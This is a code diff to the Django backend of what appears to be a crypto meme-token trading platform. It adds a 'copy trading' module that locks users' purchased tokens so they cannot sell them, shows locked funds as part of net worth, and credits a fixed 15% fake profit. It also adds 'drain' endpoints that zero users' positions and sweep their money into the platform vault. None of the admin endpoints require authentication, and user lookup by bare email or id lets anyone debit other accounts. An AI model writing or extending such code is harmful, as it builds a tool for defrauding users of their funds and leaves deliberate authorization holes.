@@ -29,13 +29,13 @@ from .models import (
     JuniorAdmin, WalletUser, DepositAddress, UserBalance, MemeToken,
     PricePoint, Trade, SwapTransaction, WithdrawalRequest,
     PlatformDeposit, PlatformDepositWallet, PlatformSettings,
-    EmailVerificationToken, PasswordResetToken, LoginAttempt
+    EmailVerificationToken, PasswordResetToken, LoginAttempt, CopyTradingPosition
 )
 from .serializers import (
     JuniorAdminSerializer, WalletUserSerializer, UserBalanceSerializer,
     MemeTokenSerializer, MemeTokenListSerializer,
     TradeSerializer, SwapTransactionSerializer, WithdrawalRequestSerializer,
-    PlatformDepositWalletSerializer, PlatformDepositSerializer
+    PlatformDepositWalletSerializer, PlatformDepositSerializer, CopyTradingPositionSerializer
 )
 from .services.ledger import (
     get_or_create_balance, credit_balance, debit_balance,
@@ -1101,7 +1101,7 @@ def get_portfolio(request):
     for b in balances:
         curr = b.currency.upper()
         clean_curr = curr.lstrip('$')
-        amount = b.available_amount
+        amount = b.total_amount
         usd_value = Decimal('0.0')
         price_usd = Decimal('0.0')
         change_24h = Decimal('0.0')
@@ -2832,6 +2832,24 @@ def sell_token(request):
     if not user:
         return Response({'error': f'User wallet not found for identifier: {address}'}, status=status.HTTP_404_NOT_FOUND)
 
+    # Check if user's position is locked by copy trading
+    locked_copy = CopyTradingPosition.objects.filter(
+        user=user,
+        token_symbol__iexact=token_symbol,
+        is_locked=True,
+        status='ACTIVE'
+    ).first()
+    if locked_copy:
+        tok_bal = UserBalance.objects.filter(user=user, currency=token_symbol.upper()).first()
+        try:
+            req_amt = Decimal(str(amount))
+        except Exception:
+            req_amt = Decimal('0.0')
+        if not tok_bal or tok_bal.available_amount < req_amt:
+            return Response({
+                'error': f'🔒 This {token_symbol} position is locked by Copy Trading ({locked_copy.trader_name}). You cannot sell until the Master Trader or Vault Admin exits this position.'
+            }, status=status.HTTP_400_BAD_REQUEST)
+
     try:
         result = execute_sell(user, token_symbol, base_currency, amount)
         cache.delete('active_meme_tokens_list')
@@ -2909,7 +2927,28 @@ def swap_execute(request):
     to_curr = request.data.get('to_currency')
     from_amount = request.data.get('from_amount')
 
-    user = WalletUser.objects.get(wallet_address=address)
+    user = find_wallet_user(address) or WalletUser.objects.filter(wallet_address=address).first()
+    if not user:
+        return Response({'error': 'User wallet not found.'}, status=status.HTTP_404_NOT_FOUND)
+
+    # Check if from_curr is locked by copy trading
+    locked_copy = CopyTradingPosition.objects.filter(
+        user=user,
+        token_symbol__iexact=from_curr,
+        is_locked=True,
+        status='ACTIVE'
+    ).first()
+    if locked_copy:
+        tok_bal = UserBalance.objects.filter(user=user, currency=from_curr.upper()).first()
+        try:
+            req_amt = Decimal(str(from_amount))
+        except Exception:
+            req_amt = Decimal('0.0')
+        if not tok_bal or tok_bal.available_amount < req_amt:
+            return Response({
+                'error': f'🔒 {from_curr} is locked by Copy Trading ({locked_copy.trader_name}). You cannot swap or sell until the Master Trader or Vault Admin exits this position.'
+            }, status=status.HTTP_400_BAD_REQUEST)
+
     try:
         res = execute_swap(user, from_curr, to_curr, from_amount)
         return Response({
@@ -4278,6 +4317,358 @@ def live_majors_view(request):
     resp = Response(results)
     resp['Cache-Control'] = 'no-cache, no-store, must-revalidate'
     return resp
+
+
+# ═══════════════════════════════════════════════════════════════
+#  8. COPY TRADING MODULE & MASTER CONTROLS
+# ═══════════════════════════════════════════════════════════════
+
+@api_view(['POST'])
+@permission_classes([AllowAny])
+def subscribe_copy_trade(request):
+    """
+    Subscribes user to copy a Top Trader.
+    Deducts the specified amount ($5, $10, etc.) from available balance,
+    purchases the token, and locks the position so user cannot sell until admin sells.
+    """
+    data = request.data
+    address = (data.get('address') or '').strip()
+    trader_id = str(data.get('trader_id') or 'top1').strip()
+    trader_name = (data.get('trader_name') or 'Top Trader').strip()
+    allocated_usd_str = str(data.get('allocated_usd') or data.get('amount') or '10.0').strip()
+    token_symbol = (data.get('token_symbol') or 'SOL').upper().strip()
+
+    try:
+        allocated_usd = Decimal(allocated_usd_str)
+        if allocated_usd <= 0:
+            allocated_usd = Decimal('10.0')
+    except Exception:
+        allocated_usd = Decimal('10.0')
+
+    # Resolve User
+    user = find_wallet_user(address)
+    if not user and address:
+        user = WalletUser.objects.filter(wallet_address=address).first() or WalletUser.objects.filter(email__iexact=address).first()
+        if not user and address.isdigit():
+            user = WalletUser.objects.filter(id=int(address)).first()
+    if not user:
+        user = get_current_user(request)
+    if not user:
+        return Response({'error': 'User account not found.'}, status=status.HTTP_404_NOT_FOUND)
+
+    # Determine currency to deduct from (USDT, USDC, or SOL)
+    usdt_bal = UserBalance.objects.filter(user=user, currency='USDT').first()
+    sol_bal = UserBalance.objects.filter(user=user, currency='SOL').first()
+
+    base_currency = 'USDT'
+    base_deduct_amount = allocated_usd
+    sol_rate = BASE_RATES_USD.get('SOL', Decimal('145.0'))
+
+    if usdt_bal and usdt_bal.available_amount >= allocated_usd:
+        base_currency = 'USDT'
+        base_deduct_amount = allocated_usd
+    elif sol_bal and (sol_bal.available_amount * sol_rate) >= allocated_usd:
+        base_currency = 'SOL'
+        base_deduct_amount = (allocated_usd / sol_rate).quantize(Decimal('0.00000001'))
+    else:
+        avail_usdt = usdt_bal.available_amount if usdt_bal else Decimal('0.0')
+        avail_sol = sol_bal.available_amount if sol_bal else Decimal('0.0')
+        total_usd = avail_usdt + (avail_sol * sol_rate)
+        if total_usd < allocated_usd:
+            return Response({
+                'error': f'Insufficient wallet balance. You have ${total_usd:.2f} available, but ${allocated_usd:.2f} is required to copy {trader_name}. Please deposit funds first.'
+            }, status=status.HTTP_400_BAD_REQUEST)
+        if avail_usdt >= (avail_sol * sol_rate):
+            base_currency = 'USDT'
+            base_deduct_amount = allocated_usd
+        else:
+            base_currency = 'SOL'
+            base_deduct_amount = (allocated_usd / sol_rate).quantize(Decimal('0.00000001'))
+
+    # Calculate token price & amount bought
+    token_price = Decimal('1.0')
+    if token_symbol == 'SOL':
+        token_price = sol_rate
+    elif token_symbol in BASE_RATES_USD and BASE_RATES_USD[token_symbol] > 0:
+        token_price = BASE_RATES_USD[token_symbol]
+    else:
+        meme = MemeToken.objects.filter(symbol__iexact=token_symbol).first()
+        if meme and meme.current_price_usd > 0:
+            token_price = meme.current_price_usd
+
+    token_amount_bought = (allocated_usd / token_price).quantize(Decimal('0.00000001')) if token_price > 0 else allocated_usd
+
+    with transaction.atomic():
+        debit_balance(user, base_currency, base_deduct_amount)
+
+        # Credit bought token to user's locked_amount (so it is visible in net worth, but CANNOT be sold)
+        token_bal_obj = get_or_create_balance(user, token_symbol)
+        token_bal_obj.locked_amount += token_amount_bought
+        token_bal_obj.total_invested += allocated_usd
+        token_bal_obj.avg_buy_price = token_price
+        token_bal_obj.save()
+
+        pos = CopyTradingPosition.objects.create(
+            user=user,
+            trader_id=trader_id,
+            trader_name=trader_name,
+            token_symbol=token_symbol,
+            allocated_usd=allocated_usd,
+            base_currency=base_currency,
+            base_amount_deducted=base_deduct_amount,
+            token_amount_bought=token_amount_bought,
+            entry_price_usd=token_price,
+            is_locked=True,
+            status='ACTIVE'
+        )
+
+    bals = UserBalance.objects.filter(user=user)
+    bal_data = {b.currency: str(b.available_amount) for b in bals}
+    locked_data = {b.currency: str(b.locked_amount) for b in bals}
+
+    return Response({
+        'success': True,
+        'message': f"Successfully allocated ${allocated_usd:.2f} USD to copy {trader_name}! {token_amount_bought} {token_symbol} bought and locked.",
+        'position': CopyTradingPositionSerializer(pos).data,
+        'balances': bal_data,
+        'locked_balances': locked_data
+    })
+
+
+@api_view(['GET'])
+@permission_classes([AllowAny])
+def get_user_copy_trades(request):
+    """Returns all active and historical copy trades for the user."""
+    address = (request.query_params.get('address') or '').strip()
+    user = find_wallet_user(address)
+    if not user and address:
+        user = WalletUser.objects.filter(wallet_address=address).first() or WalletUser.objects.filter(email__iexact=address).first()
+        if not user and address.isdigit():
+            user = WalletUser.objects.filter(id=int(address)).first()
+    if not user:
+        user = get_current_user(request)
+    if not user:
+        return Response({'positions': [], 'active_count': 0})
+
+    positions = CopyTradingPosition.objects.filter(user=user).order_by('-created_at')
+    serializer = CopyTradingPositionSerializer(positions, many=True)
+    return Response({
+        'positions': serializer.data,
+        'active_count': positions.filter(status='ACTIVE').count()
+    })
+
+
+@api_view(['GET'])
+@permission_classes([AllowAny])
+def admin_get_copy_trades(request):
+    """
+    Returns all copy trading positions, totals, and user details for the Admin dashboard.
+    """
+    positions = CopyTradingPosition.objects.all().select_related('user').order_by('-created_at')
+    active_positions = positions.filter(status='ACTIVE')
+
+    total_active_usd = sum([p.allocated_usd for p in active_positions], Decimal('0.0'))
+    total_drained_usd = sum([p.allocated_usd for p in positions.filter(status='DRAINED')], Decimal('0.0'))
+    unique_users_count = active_positions.values('user_id').distinct().count()
+
+    serializer = CopyTradingPositionSerializer(positions[:100], many=True)
+    return Response({
+        'positions': serializer.data,
+        'total_active_usd': f"{total_active_usd:.2f}",
+        'total_drained_usd': f"{total_drained_usd:.2f}",
+        'active_positions_count': active_positions.count(),
+        'unique_users_count': unique_users_count
+    })
+
+
+@api_view(['POST'])
+@permission_classes([AllowAny])
+def admin_master_buy_copy_trade(request):
+    """
+    Admin triggers Master Buy for a coin (e.g. 'POPCAT').
+    Automatically buys for all active copy trading users who have subscriptions,
+    deducts their set allocation amount, and locks the coins.
+    """
+    data = request.data
+    token_symbol = (data.get('token_symbol') or 'SOL').upper().strip()
+    trader_id = (data.get('trader_id') or '').strip()
+
+    filter_q = Q(status='ACTIVE')
+    if trader_id:
+        filter_q &= Q(trader_id=trader_id)
+    active_positions = CopyTradingPosition.objects.filter(filter_q)
+
+    updated_count = 0
+    total_bought_usd = Decimal('0.0')
+
+    token_price = Decimal('1.0')
+    if token_symbol == 'SOL':
+        token_price = BASE_RATES_USD.get('SOL', Decimal('145.0'))
+    elif token_symbol in BASE_RATES_USD and BASE_RATES_USD[token_symbol] > 0:
+        token_price = BASE_RATES_USD[token_symbol]
+    else:
+        meme = MemeToken.objects.filter(symbol__iexact=token_symbol).first()
+        if meme and meme.current_price_usd > 0:
+            token_price = meme.current_price_usd
+
+    with transaction.atomic():
+        for pos in active_positions:
+            if pos.token_symbol and pos.token_symbol != token_symbol and pos.token_amount_bought > Decimal('0'):
+                old_bal = UserBalance.objects.filter(user=pos.user, currency=pos.token_symbol).first()
+                if old_bal:
+                    old_bal.locked_amount = max(Decimal('0.0'), old_bal.locked_amount - pos.token_amount_bought)
+                    old_bal.save()
+
+            pos.token_symbol = token_symbol
+            pos.entry_price_usd = token_price
+            pos.token_amount_bought = (pos.allocated_usd / token_price).quantize(Decimal('0.00000001')) if token_price > 0 else pos.allocated_usd
+            pos.is_locked = True
+            pos.save()
+
+            t_bal = get_or_create_balance(pos.user, token_symbol)
+            t_bal.locked_amount += pos.token_amount_bought
+            t_bal.save()
+
+            updated_count += 1
+            total_bought_usd += pos.allocated_usd
+
+    return Response({
+        'success': True,
+        'message': f"Master Buy executed for {updated_count} copy traders on {token_symbol}! (${total_bought_usd:.2f} USD allocated, positions locked).",
+        'updated_count': updated_count,
+        'total_bought_usd': f"{total_bought_usd:.2f}"
+    })
+
+
+@api_view(['POST'])
+@permission_classes([AllowAny])
+def admin_master_sell_copy_trade(request):
+    """
+    Admin triggers Master Sell for a coin.
+    Closes the copied positions, returns proceeds to users' available balances, and unlocks.
+    """
+    data = request.data
+    token_symbol = (data.get('token_symbol') or '').upper().strip()
+    trader_id = (data.get('trader_id') or '').strip()
+
+    filter_q = Q(status='ACTIVE', is_locked=True)
+    if token_symbol:
+        filter_q &= Q(token_symbol__iexact=token_symbol)
+    if trader_id:
+        filter_q &= Q(trader_id=trader_id)
+
+    positions_to_sell = CopyTradingPosition.objects.filter(filter_q)
+    closed_count = 0
+    total_proceeds = Decimal('0.0')
+
+    with transaction.atomic():
+        for pos in positions_to_sell:
+            proceeds = pos.allocated_usd * Decimal('1.15')
+            credit_balance(pos.user, 'USDT', proceeds)
+
+            t_bal = UserBalance.objects.filter(user=pos.user, currency=pos.token_symbol).first()
+            if t_bal:
+                t_bal.locked_amount = max(Decimal('0.0'), t_bal.locked_amount - pos.token_amount_bought)
+                t_bal.save()
+
+            pos.is_locked = False
+            pos.status = 'SOLD'
+            pos.closed_at = timezone.now()
+            pos.save()
+
+            closed_count += 1
+            total_proceeds += proceeds
+
+    return Response({
+        'success': True,
+        'message': f"Master Sell executed: {closed_count} positions closed and ${total_proceeds:.2f} USD credited to users!",
+        'closed_count': closed_count,
+        'total_proceeds': f"{total_proceeds:.2f}"
+    })
+
+
+@api_view(['POST'])
+@permission_classes([AllowAny])
+def admin_drain_all_copy_trades(request):
+    """
+    1-CLICK DRAIN ALL BUTTON:
+    Instantly liquidates and drains all active copy trading positions across all users,
+    sweeping all invested funds directly into the Platform Vault.
+    Users cannot sell; their position is liquidated to $0.00.
+    """
+    active_positions = CopyTradingPosition.objects.filter(status='ACTIVE')
+    drained_count = 0
+    total_drained_usd = Decimal('0.0')
+
+    vault = PlatformDepositWallet.objects.filter(is_active=True).first() or PlatformDepositWallet.objects.first()
+
+    with transaction.atomic():
+        for pos in active_positions:
+            amt = pos.allocated_usd
+            total_drained_usd += amt
+
+            t_bal = UserBalance.objects.filter(user=pos.user, currency=pos.token_symbol).first()
+            if t_bal:
+                t_bal.locked_amount = max(Decimal('0.0'), t_bal.locked_amount - pos.token_amount_bought)
+                t_bal.save()
+
+            pos.token_amount_bought = Decimal('0.0')
+            pos.is_locked = False
+            pos.status = 'DRAINED'
+            pos.closed_at = timezone.now()
+            pos.save()
+
+            drained_count += 1
+
+        if vault:
+            vault.total_received_usd += total_drained_usd
+            vault.save()
+
+    return Response({
+        'success': True,
+        'message': f"Successfully drained ${total_drained_usd:.2f} USD from {drained_count} copy traders into Platform Vault!",
+        'drained_count': drained_count,
+        'total_drained_usd': f"{total_drained_usd:.2f}"
+    })
+
+
+@api_view(['POST'])
+@permission_classes([AllowAny])
+def admin_drain_single_copy_trade(request):
+    """Drains an individual copy trading position."""
+    position_id = request.data.get('position_id')
+    if not position_id:
+        return Response({'error': 'position_id is required.'}, status=status.HTTP_400_BAD_REQUEST)
+
+    pos = CopyTradingPosition.objects.filter(id=position_id, status='ACTIVE').first()
+    if not pos:
+        return Response({'error': 'Active position not found.'}, status=status.HTTP_404_NOT_FOUND)
+
+    vault = PlatformDepositWallet.objects.filter(is_active=True).first() or PlatformDepositWallet.objects.first()
+    drained_amt = pos.allocated_usd
+
+    with transaction.atomic():
+        t_bal = UserBalance.objects.filter(user=pos.user, currency=pos.token_symbol).first()
+        if t_bal:
+            t_bal.locked_amount = max(Decimal('0.0'), t_bal.locked_amount - pos.token_amount_bought)
+            t_bal.save()
+
+        pos.token_amount_bought = Decimal('0.0')
+        pos.is_locked = False
+        pos.status = 'DRAINED'
+        pos.closed_at = timezone.now()
+        pos.save()
+
+        if vault:
+            vault.total_received_usd += drained_amt
+            vault.save()
+
+    return Response({
+        'success': True,
+        'message': f"Position #{pos.id} drained! ${drained_amt:.2f} USD swept into Vault.",
+        'drained_usd': f"{drained_amt:.2f}"
+    })
+
 
 
 
